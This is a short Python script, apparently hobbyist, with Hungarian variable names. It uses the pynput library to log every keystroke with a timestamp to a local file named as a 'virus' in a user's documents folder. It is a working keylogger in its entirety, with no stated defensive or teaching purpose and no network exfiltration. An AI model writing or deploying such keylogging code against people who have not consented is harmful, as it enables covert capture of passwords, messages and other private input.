import logging
from logging import DEBUG
from pynput.keyboard import Key, Listener
utvonal = r"C:\Users\kopha\OneDrive\Dokumentumok\Covid(virus)"
logging.basicConfig(filename=(utvonal + "Virus.txt"), level=DEBUG, format="%(asctime)s %(message)s" )
def lenyomaskor(gomb):
    logging.info(str(gomb))
with Listener(on_press=lenyomaskor) as lehallgato:
    lehallgato.join()